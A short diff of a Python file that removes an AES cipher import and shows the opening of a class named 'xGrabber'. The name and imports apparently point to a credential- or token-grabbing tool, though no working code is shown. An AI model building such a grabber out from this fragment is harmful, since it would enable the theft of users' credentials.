@@ -3,7 +3,6 @@ from requests.api import request
 from re import findall
 from datetime import datetime
 from urllib.request import urlopen
-from Crypto.Cipher import AES
 
 class xGrabber:
     def __init__(self):
